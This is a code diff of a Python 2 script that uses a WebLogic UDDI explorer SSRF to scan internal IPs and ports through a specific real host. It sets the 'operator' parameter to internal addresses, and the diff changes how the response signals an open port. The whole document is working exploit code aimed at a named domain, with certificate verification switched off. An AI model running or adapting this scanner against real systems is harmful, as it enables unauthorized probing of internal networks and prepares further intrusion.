@@ -11,11 +11,7 @@ def scan(ip_str):
     exp_url = "https://sx.ac.10086.cn/uddiexplorer/SearchPublicRegistries.jsp?operator=http://%s:%s/&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search"%(ip_str,port)
     try:
       response = requests.get(exp_url, timeout=15, verify=False)
-      #SSRF判断
-      re_sult1 = re.findall('weblogic.uddi.client.structures.exception.XML_SoapException',response.content)
-      #丢失连接.端口连接不上
-      re_sult2 = re.findall('but could not connect',response.content)
-      if len(re_sult1)!=0 and len(re_sult2)==0:
+      if 'Received a response from url' in response.content:
         print ip_str+':'+port
     except Exception, e:
       pass
